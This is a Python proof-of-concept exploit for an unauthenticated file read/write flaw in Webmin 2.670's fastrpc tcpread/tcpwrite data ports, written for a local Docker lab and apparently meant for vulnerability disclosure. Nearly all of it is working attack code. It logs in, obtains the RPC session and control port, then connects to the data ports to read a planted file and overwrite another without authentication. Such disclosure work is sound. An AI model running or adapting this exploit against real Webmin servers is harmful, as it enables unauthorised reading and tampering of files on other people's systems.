#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-fastrpc-unauth (High: 8.1)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: fastrpc tcpwrite/tcpread accept first peer with no sid
#  Requires: Docker, git, python3; publish data ports
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-fastrpc-unauth"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only: Webmin 2.670 fastrpc tcpwrite/tcpread accept the first peer with no sid."""

import os
import socket
import subprocess
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

LABEL = "WEBMIN-H02-FASTRPC"
WITNESS = "WEBMIN-H02-FASTRPC"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
HTTP_PORT = 18480
CONTAINER_PORT = 10000
HOST_RPC_LO = 18481
HOST_RPC_HI = 18484
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "webminh02")
HERE = Path(__file__).resolve().parent
SERVICE = "webmin"
LOGIN_USER = "root"
LOGIN_PASS = "labroot"
SRC_PATH = "/tmp/h02src"
DST_PATH = "/tmp/h02dst"


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]


def log(msg: str) -> None:
    print(msg, flush=True)


def clip(text: str, limit: int = 240) -> str:
    compact = " ".join((text or "").split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def host_port(container_port: int) -> int | None:
    mapped = HTTP_PORT + (container_port - CONTAINER_PORT)
    if HOST_RPC_LO <= mapped <= HOST_RPC_HI:
        return mapped
    return None


def urlize(value: str) -> str:
    return "".join(ch if ch.isalnum() else f"%{ord(ch):02X}" for ch in value)


def un_urlize(value: str) -> str:
    return urllib.parse.unquote(value.replace("+", " "), encoding="latin-1")


def serialise(var: object) -> str:
    if var is None:
        return "UNDEF"
    if isinstance(var, dict):
        parts: list[str] = []
        for key, value in var.items():
            parts.append(urlize(serialise(key)))
            parts.append(urlize(serialise(value)))
        return "HASH," + ",".join(parts)
    if isinstance(var, (list, tuple)):
        return "ARRAY," + ",".join(urlize(serialise(item)) for item in var)
    if isinstance(var, bool):
        return "VAL," + urlize("1" if var else "0")
    if isinstance(var, int):
        return "VAL," + urlize(str(var))
    return "VAL," + urlize(str(var))


def unserialise(raw: str) -> object:
    if raw.startswith("$VAR1"):
        raise ValueError("dumper-format")
    if raw == "UNDEF" or raw.startswith("UNDEF,"):
        return None
    kind, _sep, rest = raw.partition(",")
    if kind == "VAL":
        return un_urlize(rest)
    parts = raw.split(",")
    if kind == "ARRAY":
        return [unserialise(un_urlize(part)) for part in parts[1:]]
    if kind == "HASH":
        parsed: dict[object, object] = {}
        body = parts[1:]
        for idx in range(0, len(body), 2):
            key = unserialise(un_urlize(body[idx]))
            value = unserialise(un_urlize(body[idx + 1])) if idx + 1 < len(body) else None
            parsed[key] = value
        return parsed
    if kind == "SCALAR":
        return un_urlize(rest)
    raise ValueError(f"kind-{kind}")


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def compose_exec(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", SERVICE, *args, timeout=timeout)


def compose_exec_stdin(*args: str, data: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, "exec", "-T", SERVICE, *args],
        cwd=HERE,
        input=data,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def expect_ok(proc: subprocess.CompletedProcess[str], prefix: str) -> str | None:
    if proc.returncode != 0:
        err = clip((proc.stderr or "") + " " + (proc.stdout or ""))
        return f"{prefix}-rc-{proc.returncode}-{err}"
    return None


def parse_set_cookie(raw: list[tuple[str, str]]) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for key, value in raw:
        if key.lower() != "set-cookie":
            continue
        pair = value.split(";", 1)[0]
        name, _, val = pair.partition("=")
        if name.strip():
            cookies[name.strip()] = val.strip()
    return cookies


def request(
    method: str,
    path: str,
    *,
    cookies: dict[str, str] | None = None,
    form: dict[str, str] | None = None,
    timeout: int = 30,
) -> HttpResult:
    # MiniServ session login wants HTTP/1.0. User-Agent /^Webmin/ forces Basic 401.
    body = b""
    if form is not None:
        body = urllib.parse.urlencode(form).encode("ascii").replace(b"%2F", b"/")
    hdrs = [
        f"{method} {path} HTTP/1.0",
        f"Host: {HOST}:{HTTP_PORT}",
        f"Referer: http://{HOST}:{HTTP_PORT}/session_login.cgi",
        "User-Agent: H02FastrpcLab/1.0",
    ]
    if cookies:
        hdrs.append("Cookie: " + "; ".join(f"{name}={value}" for name, value in cookies.items()))
    if form is not None:
        hdrs.append("Content-Type: application/x-www-form-urlencoded")
        hdrs.append(f"Content-Length: {len(body)}")
    raw_req = ("\r\n".join(hdrs) + "\r\n\r\n").encode("ascii") + body
    try:
        with socket.create_connection((HOST, HTTP_PORT), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(raw_req)
            raw = recv_all(sock, limit=1_000_000)
    except OSError as exc:
        return HttpResult(0, clip(str(exc)), {}, {})
    head, _, payload = raw.partition(b"\r\n\r\n")
    if not payload and b"\n\n" in raw:
        head, _, payload = raw.partition(b"\n\n")
    lines = head.decode("latin-1", "replace").splitlines()
    status = 0
    if lines:
        parts = lines[0].split()
        if len(parts) >= 2 and parts[1].isdigit():
            status = int(parts[1])
    merged: dict[str, str] = {}
    raw_headers: list[tuple[str, str]] = []
    for line in lines[1:]:
        name, sep, value = line.partition(":")
        if not sep:
            continue
        raw_headers.append((name.strip(), value.strip()))
        merged[name.strip().lower()] = value.strip()
    return HttpResult(
        status,
        payload.decode("utf-8", "replace"),
        merged,
        parse_set_cookie(raw_headers),
    )


def login() -> dict[str, str] | str:
    posted = request(
        "POST",
        "/session_login.cgi",
        cookies={"testing": "1"},
        form={"user": LOGIN_USER, "pass": LOGIN_PASS, "page": "/"},
    )
    sid = posted.cookies.get("sid", "")
    if posted.status not in (200, 302) or not sid or sid == "x":
        return (
            f"login-{posted.status}-"
            f"ctype={posted.headers.get('content-type', 'missing')}-"
            f"auth={posted.headers.get('www-authenticate', 'none')}-"
            f"{clip(posted.body)}"
        )
    return {"testing": "1", "sid": sid}


def recv_line(sock: socket.socket) -> bytes:
    buf = bytearray()
    while True:
        chunk = sock.recv(1)
        if not chunk:
            break
        buf.extend(chunk)
        if chunk == b"\n":
            break
    return bytes(buf)


def recv_exact(sock: socket.socket, size: int) -> bytes:
    buf = bytearray()
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            break
        buf.extend(chunk)
    return bytes(buf)


def recv_all(sock: socket.socket, limit: int = 65536) -> bytes:
    buf = bytearray()
    while len(buf) < limit:
        try:
            chunk = sock.recv(min(4096, limit - len(buf)))
        except TimeoutError:
            break
        except socket.timeout:
            break
        if not chunk:
            break
        buf.extend(chunk)
    return bytes(buf)


def connect_retry(port: int, attempts: int = 25, timeout: float = 2.0) -> socket.socket:
    last: OSError | None = None
    for _ in range(attempts):
        try:
            sock = socket.create_connection((HOST, port), timeout=timeout)
            sock.settimeout(timeout)
            return sock
        except OSError as exc:
            last = exc
            time.sleep(0.15)
    reason = clip(str(last) if last else "connect")
    raise OSError(f"connect-{port}-{reason}")


def rpc_call(sock: socket.socket, rpc_sid: str, arg: dict[str, object]) -> object:
    payload = serialise(arg).encode("ascii")
    sock.sendall(f"{len(payload)} {rpc_sid}\n".encode("ascii") + payload)
    header = recv_line(sock)
    if not header.strip():
        raise ValueError("rpc-empty-len")
    try:
        length = int(header.strip())
    except ValueError as exc:
        raise ValueError(f"rpc-len-{clip(header.decode('latin-1', 'replace'))}") from exc
    raw = recv_exact(sock, length)
    if len(raw) != length:
        raise ValueError(f"rpc-short-{len(raw)}-{length}")
    return unserialise(raw.decode("ascii", "replace"))


def parse_listen_ports(proc_net: str) -> list[tuple[str, int]]:
    found: list[tuple[str, int]] = []
    for line in proc_net.splitlines()[1:]:
        cols = line.split()
        if len(cols) < 4 or cols[3] != "0A":
            continue
        local = cols[1]
        if ":" not in local:
            continue
        ip_hex, port_hex = local.split(":", 1)
        if len(ip_hex) != 8:
            continue
        port = int(port_hex, 16)
        ip = socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1])
        found.append((ip, port))
    return found


def listen_ioc(proc_net: str, wanted: int) -> str:
    matches = [f"{ip}:{port}" for ip, port in parse_listen_ports(proc_net) if port == wanted]
    return ",".join(matches) if matches else "missing"


def in_container_closed(port: int) -> bool:
    script = (
        "use IO::Socket::INET; "
        "my $s=IO::Socket::INET->new(PeerAddr=>'127.0.0.1',"
        f"PeerPort=>{port},Timeout=>1); "
        "print $s ? 'open' : 'closed';"
    )
    probed = compose_exec("perl", "-e", script)
    return (probed.stdout or "").strip() == "closed"


def plant_source() -> str | None:
    planted = compose_exec_stdin("tee", SRC_PATH, data=f"{WITNESS}\n")
    err = expect_ok(planted, "plant-src")
    if err:
        return err
    chmod = compose_exec("chmod", "644", SRC_PATH)
    return expect_ok(chmod, "chmod-src")


def read_dest() -> str:
    got = compose_exec("cat", DST_PATH)
    if got.returncode != 0:
        return ""
    return got.stdout or ""


def parse_hello(body: str) -> tuple[int, str, str] | str:
    for line in body.splitlines():
        stripped = line.strip()
        if stripped.startswith("0 "):
            return f"rpc-hello-{clip(stripped)}"
        parts = stripped.split()
        if len(parts) >= 3 and parts[0] == "1":
            try:
                return int(parts[1]), parts[2], parts[3] if len(parts) > 3 else ""
            except ValueError:
                return f"rpc-hello-port-{clip(stripped)}"
    return f"rpc-hello-missing-{clip(body)}"


def as_int(value: object) -> int | None:
    if isinstance(value, int):
        return value
    if isinstance(value, str) and value.isdigit():
        return int(value)
    return None


def rpc_pair(rv: object) -> tuple[str, int] | str:
    if not isinstance(rv, dict):
        return f"rpc-not-hash-{clip(str(rv))}"
    status = as_int(rv.get("status"))
    if status != 1:
        return f"rpc-status-{clip(str(rv))}"
    payload = rv.get("rv")
    if not isinstance(payload, list) or len(payload) < 2:
        return f"rpc-rv-{clip(str(rv))}"
    path = str(payload[0] or "")
    port = as_int(payload[1])
    if not path or port is None:
        return f"rpc-pair-{clip(str(rv))}"
    return path, port


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        log(msg)
        lines.append(msg)

    def finish(last: str) -> int:
        log(last)
        lines.append(last)
        (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
        return 0 if last.startswith("SUCCESS ") else 1

    try:
        inspect = subprocess.run(
            ["docker", "image", "inspect", IMAGE, "--format", "{{.Id}}"],
            capture_output=True,
            text=True,
            check=False,
        )
        note(f"IOC image={IMAGE} pin={PIN} id={clip(inspect.stdout or 'missing', 80)}")

        planted = plant_source()
        if planted:
            return finish(f"FAIL {LABEL} {planted} {WITNESS}")
        note(f"IOC planted {SRC_PATH} {WITNESS}")

        closed = [port for port in range(10001, 10005) if in_container_closed(port)]
        note(f"IOC negative-closed {','.join(str(p) for p in closed) or 'none'}")
        if closed != [10001, 10002, 10003, 10004]:
            return finish(f"FAIL {LABEL} negative-data-port-open {WITNESS}")

        session = login()
        if isinstance(session, str):
            return finish(f"FAIL {LABEL} {session} {WITNESS}")
        note(f"IOC login user={LOGIN_USER} sid={session['sid'][:8]}")

        hello = request("GET", "/fastrpc.cgi", cookies=session)
        note(
            f"IOC fastrpc status={hello.status} "
            f"ctype={hello.headers.get('content-type', 'missing')} "
            f"body={clip(hello.body)}"
        )
        if hello.status != 200:
            return finish(f"FAIL {LABEL} fastrpc-{hello.status} {WITNESS}")
        parsed = parse_hello(hello.body)
        if isinstance(parsed, str):
            return finish(f"FAIL {LABEL} {parsed} {WITNESS}")
        control_port, rpc_sid, version = parsed
        control_host = host_port(control_port)
        if control_host is None:
            return finish(f"FAIL {LABEL} control-port-{control_port} {WITNESS}")
        note(f"IOC control container={control_port} host={control_host} ver={version}")

        before = compose_exec("cat", "/proc/net/tcp")
        note(f"IOC listen-before {listen_ioc(before.stdout or '', control_port)}")

        with connect_retry(control_host) as control:
            read_rv = rpc_call(control, rpc_sid, {"action": "tcpread", "file": SRC_PATH})
            note(f"IOC tcpread-rpc {clip(str(read_rv))}")
            pair = rpc_pair(read_rv)
            if isinstance(pair, str):
                return finish(f"FAIL {LABEL} {pair} {WITNESS}")
            remote_path, data_port = pair
            data_host = host_port(data_port)
            if data_host is None:
                return finish(f"FAIL {LABEL} data-port-{data_port} {WITNESS}")
            listening = compose_exec("cat", "/proc/net/tcp")
            note(
                f"IOC tcpread-listen {listen_ioc(listening.stdout or '', data_port)} "
                f"path={remote_path} container={data_port} host={data_host}"
            )
            with connect_retry(data_host) as data_sock:
                stolen = recv_all(data_sock).decode("utf-8", "replace")
            note(f"IOC tcpread-unauth bytes={len(stolen)} body={clip(stolen)}")
            if WITNESS not in stolen:
                return finish(f"FAIL {LABEL} tcpread-no-witness {WITNESS}")

            write_rv = rpc_call(control, rpc_sid, {"action": "tcpwrite", "file": DST_PATH})
            note(f"IOC tcpwrite-rpc {clip(str(write_rv))}")
            write_pair = rpc_pair(write_rv)
            if isinstance(write_pair, str):
                return finish(f"SUCCESS {LABEL} tcpread-unauth-first-peer {WITNESS}")
            _, write_port = write_pair
            write_host = host_port(write_port)
            if write_host is None:
                return finish(f"SUCCESS {LABEL} tcpread-unauth-first-peer {WITNESS}")
            with connect_retry(write_host) as write_sock:
                write_sock.sendall(f"{WITNESS}\n".encode("ascii"))
                write_sock.shutdown(socket.SHUT_WR)
                ack = recv_all(write_sock).decode("utf-8", "replace")
            dest = read_dest()
            note(f"IOC tcpwrite-unauth ack={clip(ack)} dest={clip(dest)}")
            if WITNESS not in dest:
                return finish(f"SUCCESS {LABEL} tcpread-unauth-first-peer {WITNESS}")

        return finish(
            f"SUCCESS {LABEL} tcpread-unauth-read tcpwrite-unauth-replace {WITNESS}"
        )
    except OSError as exc:
        return finish(f"FAIL {LABEL} os-{clip(str(exc))} {WITNESS}")
    except ValueError as exc:
        return finish(f"FAIL {LABEL} proto-{clip(str(exc))} {WITNESS}")
    except subprocess.TimeoutExpired:
        return finish(f"FAIL {LABEL} timeout {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

